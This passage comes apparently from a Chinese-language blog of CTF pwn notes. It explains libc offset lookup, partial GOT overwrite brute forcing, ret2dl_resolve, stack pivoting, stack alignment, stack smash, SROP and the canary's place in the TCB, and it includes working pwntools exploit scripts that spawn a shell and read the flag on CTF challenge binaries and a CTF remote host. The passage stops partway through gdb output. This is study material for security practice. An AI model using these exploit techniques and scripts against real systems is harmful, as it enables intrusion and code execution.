class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ref:  https://github.com/lieanu/LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另一个可以本地部署的实用工具是libc-database</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ./find <span class="built_in">printf</span> 260 puts f30</span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br><span class="line">$ ./dump libc6_2.19-0ubuntu6.6_i386</span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br><span class="line">$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br></pre></td></tr></table></figure><h4 id="partial-overwrite">partial_overwrite</h4><h5 id="前置知识">前置知识</h5><p>针对没有泄露的赛题，可以考虑partial_overwrite改写<code>got</code>表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。</p><p>考虑对于一个<code>got</code>表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖<code>got</code>为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall</p><h5 id="爆破脚本写法">爆破脚本写法</h5><p>一个爆破脚本模板:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">elf =<span class="string">&#x27;./ciscn_s_3&#x27;</span></span><br><span class="line">remote_add = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">remote_port = <span class="number">29554</span></span><br><span class="line"></span><br><span class="line">main_add = <span class="number">0x40051d</span></span><br><span class="line">off = <span class="number">0x130</span></span><br><span class="line">system_add = <span class="number">0x400517</span></span><br><span class="line">rtframe = <span class="number">0x4004da</span></span><br><span class="line">ret_add = <span class="number">0x4004e9</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">20</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            p = remote(remote_add, remote_port, timeout = <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            p = gdb.debug(elf)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(elf, timeout = <span class="number">1</span>)</span><br><span class="line">        payload1 = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + cyclic(<span class="number">0x8</span>)</span><br><span class="line">        payload1+= p64(main_add)</span><br><span class="line"></span><br><span class="line">        p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">        stack_add = u64(p.recv(<span class="number">0x28</span>)[-<span class="number">8</span>::]) - off</span><br><span class="line"></span><br><span class="line">        frame = SigreturnFrame()</span><br><span class="line">        frame.rax = <span class="number">0x3b</span></span><br><span class="line">        frame.rdi = stack_add</span><br><span class="line">        frame.rsi = <span class="number">0</span></span><br><span class="line">        frame.rdx = <span class="number">0</span></span><br><span class="line">        frame.rsp = stack_add</span><br><span class="line">        frame.rip = system_add</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + cyclic(<span class="number">0x8</span>)</span><br><span class="line">        payload+= p64(rtframe)</span><br><span class="line">        payload+= p64(system_add)</span><br><span class="line">        payload+= <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#p.sendline(&#x27;a&#x27;)</span></span><br><span class="line">        <span class="comment">#p.recvuntil(&#x27;\0&#x27;)</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recvline())</span><br><span class="line">        </span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">    off+=<span class="number">0x8</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>核心模板:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    try:</span><br><span class="line"><span class="comment">// p = process()</span></span><br><span class="line"><span class="comment">// pass</span></span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        print(p.recvline())</span><br><span class="line">        p.close()</span><br><span class="line">    except BaseException as e:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="comment">// pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>采用grep 获取输出包含flag的行就行</p><h4 id="ret2dl-resolve">ret2dl_resolve()</h4><p>延迟绑定会使用_dl_resolve()函数</p><ul><li><p>_dl_resolve中</p><p>_dl_resolve调用_dl_fixup, _dl_dixup流程：</p><ol><li>通过link_map 获得.dynsym、.dynstr、.rel.plt地址</li><li>通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针</li><li>通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针</li><li>检查r_info</li><li>检查&amp;(Elf64_Sym)-&gt;st_other</li><li>通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数</li></ol></li></ul><p>综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)</p><table><thead><tr><th style="text-align:left"></th><th style="text-align:left">修改 dynamic 节的内容</th><th style="text-align:left">修改重定位表项的位置</th><th style="text-align:left">伪造 linkmap</th></tr></thead><tbody><tr><td style="text-align:left">主要前提要求</td><td style="text-align:left">无</td><td style="text-align:left">无</td><td style="text-align:left">无信息泄漏时需要 libc</td></tr><tr><td style="text-align:left">适用情况</td><td style="text-align:left">NO RELRO</td><td style="text-align:left">NO RELRO, Partial RELRO</td><td style="text-align:left">NO RELRO, Partial RELRO</td></tr><tr><td style="text-align:left">注意点</td><td style="text-align:left"></td><td style="text-align:left">确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td><td style="text-align:left">确保重定位位置可写；需要着重伪造重定位表项、符号表；</td></tr></tbody></table><h3 id="Tricks">Tricks</h3><h4 id="stack-pivoting">stack pivoting</h4><p>栈迁移技巧， 主要针对可溢出字节较少的情况，通过<code>leave</code>此类指令控制rsp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;leave 相当于:</span><br><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">;那么考虑将栈帧中rbp地址改为栈迁移目的地址</span><br><span class="line">;leave两次之后，就可以将栈转移到目的地址</span><br><span class="line">;同时要现在目的地址布置好fake_stack</span><br></pre></td></tr></table></figure><p>可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数</p><p>不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:</p><ul><li>在第一次read读入后将rbp改为要写入的位置</li><li>ret到read</li><li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li><li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li></ul><h5 id="example">example</h5><p>一个程序反汇编后:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You can use stackoverflow.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But only overflow a bit more...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And you must print first.&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">0x30</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串</p><p>但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行</p><p><s>虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误</s></p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ezrop&#x27;</span>)</span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./ezrop&#x27;)</span></span><br><span class="line"></span><br><span class="line">m = u64(p.recv(<span class="number">40</span>)[-<span class="number">8</span>:])</span><br><span class="line"></span><br><span class="line">payloads = p64(<span class="number">0x400863</span>) + <span class="string">b&#x27;/bin/sh\0&#x27;</span> + p64(<span class="number">0x400600</span>)</span><br><span class="line"></span><br><span class="line">payloads += cyclic(<span class="number">0x18</span>)</span><br><span class="line">payloads += p64(<span class="number">0x601848</span>+<span class="number">0x30</span>) + p64(<span class="number">0x4007d9</span>)</span><br><span class="line"></span><br><span class="line">p.send(payloads)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payloads = p64(<span class="number">0x4006fa</span>) + p64(<span class="number">0x400863</span>) + p64(<span class="number">0x601868</span>) + p64(<span class="number">0x400600</span>) </span><br><span class="line">payloads += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payloads += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payloads += p64(<span class="number">0x601848</span>-<span class="number">0x8</span>) + p64(<span class="number">0x4007f9</span>)</span><br><span class="line"></span><br><span class="line">p.send(payloads)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00007f7b3ce92bb0      0x00007f7b3ccf8450</span></span><br></pre></td></tr></table></figure><h4 id="栈对齐">栈对齐</h4><p>栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。</p><p>这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump</p><p>可以:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -c core</span><br></pre></td></tr></table></figure><p>调试core文件</p><p>如果终止指令类似于:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa8677a3396</span>    movaps xmmword ptr [rsp + <span class="number">0x40</span>], xmm0</span><br></pre></td></tr></table></figure><p>说明是栈对齐的原因，小心调整栈帧就行</p><h4 id="Stack-smash">Stack smash</h4><p>对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。</p><p>在开启cannary 防护的题目中，检测到栈溢出后，会调用 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag</p><h4 id="SROP">SROP</h4><h5 id="前置知识-2">前置知识:</h5><p>在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。</p><p>那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。</p><p>同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。</p><p>SROP简要流程:</p><ol><li>构造fake_frame</li><li>控制当前rsp指向fake_frame底部</li><li>sigreturn调用</li></ol><p>sigFrame结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="pwntools-srop">pwntools.srop</h5><p>pwntools集成了SROP的模块，可以帮助制作fake_frame:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 一个简单的例子</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure><h4 id="stack-gaurd">stack_gaurd</h4><p>我们都知道canary来自<code>fs:0x28</code>， <code>fs</code> 实际上指向的是<a href="http://www.openwall.com/lists/oss-security/2018/02/27/5">TCB</a> ， TCB结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;                <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                           thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;                <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;  <span class="comment">// not in 32bit</span></span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>0x28的偏移实际上是指向的stack_guard</p><p>那么如何确定段选择地址呢，我们知道段寄存器的基地址是不可见的，而且fs/gs可见的数值也不是段选择子而是0，所以在gdb中我们选择<code>pthread_self()</code> 来查看<code>fs</code>的地址，对比上面的结构，我们可以看到此函数其实是返回了结构体自身的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pthread_t</span></span><br><span class="line"><span class="title function_">pthread_self</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">pthread_t</span>) THREAD_SELF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在gdb中查看这个地址，发现这个地址实际上在libc的附近。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p/x (tcbhead_t)*(tcbhead_t *)(pthread_self())</span><br><span class="line">p/x (void*)(pthread_self())</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555554000     0x555555555000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555556000     0x555555557000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555557000     0x555555558000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x7ffff7dc7000     0x7ffff7dc9000 rw-p     2000      0 [anon_7ffff7dc7]</span><br><span class="line">    0x7ffff7dc9000     0x7ffff7def000 r--p    26000      0 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7def000     0x7ffff7f4c000 r-xp   15d000  26000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f4c000     0x7ffff7f99000 r--p    4d000 183000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 1d0000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 1d4000 /usr/lib64/libc.so.6</span><br><span class="line">    